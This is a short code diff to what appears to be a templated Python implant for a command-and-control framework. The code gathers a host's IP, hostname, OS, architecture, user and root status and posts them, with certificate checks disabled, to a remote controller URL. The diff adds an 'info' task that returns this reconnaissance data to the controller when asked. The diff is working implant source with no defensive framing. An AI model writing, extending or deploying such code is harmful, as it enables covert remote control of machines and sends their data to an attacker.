@@ -71,9 +71,9 @@ data = {
     "address": socket.gethostbyname(socket.gethostname()),
     "hostname": sp.getoutput("hostname"),
     "os": sp.getoutput("uname").lower(),
+    "architecture": sp.getoutput("uname -m"),
     "user": sp.getoutput("whoami"),
     "admin": os.getuid() == 0,
-    "architecture": sp.getoutput("uname -m"),
     "stager": {{stager.id}},
 }
 name = r.post(f"{URL}/connect", json=data, verify=False).text
@@ -199,6 +199,14 @@ while i < {{stager.timeout}}:
             else:
                 data["success"] = False
                 data["output"] = "Language/Code type not supported"
+        elif task["type"] == "info":
+            data["output"] = {
+                    "address": socket.gethostbyname(socket.gethostname()),
+                    "hostname": sp.getoutput("hostname"),
+                    "user": sp.getoutput("whoami"),
+                    "admin": os.getuid() == 0,
+                }
+            data["success"] = True
         else:
             data["success"] = False
             data["output"] = "Task type not supported."  
